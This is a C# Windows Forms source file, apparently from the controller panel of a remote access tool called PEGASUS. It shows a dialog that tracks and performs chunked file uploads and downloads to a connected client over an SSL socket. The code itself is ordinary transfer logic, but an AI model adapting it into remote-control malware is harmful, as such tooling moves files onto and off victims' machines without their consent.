using PEGASUS.Diadyktio;
using PEGASUS.IcarusWings;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;

namespace PEGASUS.Design
{
    public partial class FormDownloadFile : Form
    {
        private long BytesSent;
        public string ClientFullFileName;
        public string DirPath;
        public long FileSize = 0;
        public string FullFileName;
        private bool IsUpload;

        public FormDownloadFile()
        {
            InitializeComponent();
        }

        public PEGALISIUS F { get; set; }
        internal Clients Client { get; set; }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (FileSize >= 2147483647)
            {
                timer1.Stop();
                MessageBox.Show("Don't support files larger than 2GB.");
                Dispose();
            }
            else
            {
                if (!IsUpload)
                {
                    labelsize.Text =
                        $"{Methods.BytesToString(FileSize)} \\ {Methods.BytesToString(Client.BytesRecevied)}";
                    if (Client.BytesRecevied >= FileSize)
                    {
                        labelsize.Text = "Downloaded";
                        labelsize.ForeColor = Color.FromArgb(3, 130, 200);
                        timer1.Stop();
                    }
                }
                else
                {
                    labelsize.Text = $"{Methods.BytesToString(FileSize)} \\ {Methods.BytesToString(BytesSent)}";
                    if (BytesSent >= FileSize)
                    {
                        labelsize.Text = "Uploaded";
                        labelsize.ForeColor = Color.FromArgb(3, 130, 200);
                        timer1.Stop();
                    }
                }
            }
        }

        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Client?.Disconnected();
                timer1?.Dispose();
            }
            catch
            {
            }
        }

        public void Send(object obj)
        {
            lock (Client.SendSync)
            {
                try
                {
                    IsUpload = true;
                    var msg = (byte[])obj;
                    var buffersize = BitConverter.GetBytes(msg.Length);
                    Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                    Client.SslClient.Write(buffersize, 0, buffersize.Length);

                    Debug.WriteLine("send chunks");
                    using (var memoryStream = new MemoryStream(msg))
                    {
                        var read = 0;
                        memoryStream.Position = 0;
                        var chunk = new byte[50 * 1000];
                        while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                        {
                            Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                            Client.SslClient.Write(chunk, 0, read);
                            BytesSent += read;
                        }
                    }

                    Program.form1.BeginInvoke((MethodInvoker)(() => { Close(); }));
                }
                catch
                {
                    Client?.Disconnected();
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                   {
                       labelsize.Text = "Error";
                       labelsize.ForeColor = Color.Red;
                   }));
                }
            }
        }
    }
}